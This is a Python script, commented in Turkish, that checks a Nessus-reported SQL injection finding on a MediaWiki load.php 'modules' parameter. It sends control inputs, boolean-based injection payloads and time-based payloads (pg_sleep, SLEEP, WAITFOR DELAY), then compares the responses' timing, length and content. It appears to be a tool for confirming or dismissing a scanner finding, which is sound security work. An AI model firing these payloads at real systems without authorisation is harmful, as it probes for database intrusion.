#!/usr/bin/env python3

import requests
import time
import hashlib
import statistics
import difflib
import random
import string

requests.packages.urllib3.disable_warnings()

# ============================================================
# SADECE BURAYI DOLDUR
# Örnek format: "wiki.example.internal"
# ============================================================

TARGET_HOST = ""

# http / https hangisiyse değiştir
SCHEME = "http"

BASE_URL = f"{SCHEME}://{TARGET_HOST}/load.php"

# Nessus'un test ettiği ResourceLoader modules değerinin başlangıcı
BASE_MODULE = (
    "ext.visualEditor.desktopArticleTarget.noscript"
    "|skins.citizen.codex.styles"
    "|skins.citizen.icons"
    ",styles"
)

COMMON_PARAMS = {
    "skin": "citizen",
    "lang": "tr",
    "only": "styles",
}

TIMEOUT = 12
REPEAT = 4


def sha256(data):
    return hashlib.sha256(data).hexdigest()


def similarity(a, b):
    return difflib.SequenceMatcher(
        None,
        a.decode("utf-8", errors="ignore"),
        b.decode("utf-8", errors="ignore"),
    ).ratio()


def send(modules_value):
    params = COMMON_PARAMS.copy()
    params["modules"] = modules_value

    start = time.perf_counter()

    try:
        r = requests.get(
            BASE_URL,
            params=params,
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=False,
        )

        elapsed = time.perf_counter() - start

        return {
            "ok": True,
            "status": r.status_code,
            "length": len(r.content),
            "time": elapsed,
            "hash": sha256(r.content),
            "body": r.content,
            "url": r.url,
        }

    except requests.RequestException as e:
        return {
            "ok": False,
            "error": str(e),
            "time": time.perf_counter() - start,
        }


def print_result(name, result):
    if not result["ok"]:
        print(f"{name:<30} ERROR {result['error']}")
        return

    print(
        f"{name:<30} "
        f"HTTP={result['status']} "
        f"LEN={result['length']} "
        f"TIME={result['time']:.3f}s "
        f"HASH={result['hash'][:12]}"
    )


def run_pair(name, true_payload, false_payload):
    print("\n" + "=" * 80)
    print(f"[SQL TEST] {name}")
    print("=" * 80)

    true_results = []
    false_results = []

    for i in range(REPEAT):

        if i % 2 == 0:
            t = send(BASE_MODULE + true_payload)
            f = send(BASE_MODULE + false_payload)
        else:
            f = send(BASE_MODULE + false_payload)
            t = send(BASE_MODULE + true_payload)

        true_results.append(t)
        false_results.append(f)

        print_result(f"TRUE  #{i+1}", t)
        print_result(f"FALSE #{i+1}", f)

        if t["ok"] and f["ok"]:
            print(
                f"  body similarity: "
                f"{similarity(t['body'], f['body']):.5f}"
            )

        time.sleep(0.3)

    valid_t = [x for x in true_results if x["ok"]]
    valid_f = [x for x in false_results if x["ok"]]

    if not valid_t or not valid_f:
        return

    t_times = [x["time"] for x in valid_t]
    f_times = [x["time"] for x in valid_f]

    print("\nSUMMARY")

    print(
        f"TRUE : median={statistics.median(t_times):.3f}s "
        f"lengths={sorted(set(x['length'] for x in valid_t))} "
        f"hashes={len(set(x['hash'] for x in valid_t))}"
    )

    print(
        f"FALSE: median={statistics.median(f_times):.3f}s "
        f"lengths={sorted(set(x['length'] for x in valid_f))} "
        f"hashes={len(set(x['hash'] for x in valid_f))}"
    )

    similarities = [
        similarity(t["body"], f["body"])
        for t, f in zip(valid_t, valid_f)
    ]

    if similarities:
        print(
            "TRUE/FALSE mean similarity="
            f"{statistics.mean(similarities):.5f}"
        )


def normal_input_tests():

    print("\n" + "#" * 80)
    print("# NON-SQL / FALSE-POSITIVE CONTROL TEST")
    print("#" * 80)

    baseline = send(BASE_MODULE)
    print_result("BASELINE", baseline)

    tests = [
        "zz",
        "yy",
        "aa",
        "bb",
        "invalidmodule",
        "foobar123",
        "_",
        "-",
        ".",
    ]

    for value in tests:

        result = send(BASE_MODULE + value)
        print_result(value, result)

        if baseline["ok"] and result["ok"]:
            print(
                "  vs baseline similarity="
                f"{similarity(baseline['body'], result['body']):.5f}"
            )

    print("\nRandom suffix tests")

    for i in range(5):

        suffix = "".join(
            random.choice(
                string.ascii_letters + string.digits
            )
            for _ in range(12)
        )

        result = send(BASE_MODULE + suffix)

        print_result(suffix, result)

        if baseline["ok"] and result["ok"]:
            print(
                "  vs baseline similarity="
                f"{similarity(baseline['body'], result['body']):.5f}"
            )


def boolean_tests():

    tests = [

        (
            "single quote AND",
            "' AND 1=1-- ",
            "' AND 1=2-- ",
        ),

        (
            "single quote OR",
            "' OR 1=1-- ",
            "' OR 1=2-- ",
        ),

        (
            "double quote AND",
            '" AND 1=1-- ',
            '" AND 1=2-- ',
        ),

        (
            "parenthesis AND",
            "') AND (1=1)-- ",
            "') AND (1=2)-- ",
        ),

        (
            "string comparison",
            "' AND 'a'='a'-- ",
            "' AND 'a'='b'-- ",
        ),
    ]

    for name, true_payload, false_payload in tests:
        run_pair(name, true_payload, false_payload)


def time_based_tests():

    print("\n" + "#" * 80)
    print("# TIME-BASED SQL INJECTION TESTS")
    print("#" * 80)

    # PostgreSQL
    run_pair(
        "PostgreSQL pg_sleep",
        "'; SELECT pg_sleep(2)-- ",
        "'; SELECT pg_sleep(0)-- ",
    )

    # MySQL / MariaDB
    run_pair(
        "MySQL SLEEP",
        "' AND SLEEP(2)-- ",
        "' AND SLEEP(0)-- ",
    )

    # SQL Server
    run_pair(
        "SQL Server WAITFOR",
        "'; WAITFOR DELAY '0:0:2'-- ",
        "'; WAITFOR DELAY '0:0:0'-- ",
    )


def main():

    if not TARGET_HOST.strip():
        print("ERROR: TARGET_HOST değişkenini tanımlamalısın.")
        print('Örnek: TARGET_HOST = "wiki.example.internal"')
        return

    print("""
================================================================
SQL Injection Validation
================================================================
Target    : %s
Endpoint  : /load.php
Parameter : modules

Tests:
  - Normal baseline
  - Nessus zz / yy
  - Random/non-SQL inputs
  - Boolean-based SQLi
  - PostgreSQL time-based
  - MySQL/MariaDB time-based
  - SQL Server time-based
================================================================
""" % BASE_URL)

    normal_input_tests()
    boolean_tests()
    time_based_tests()


if __name__ == "__main__":
    main()
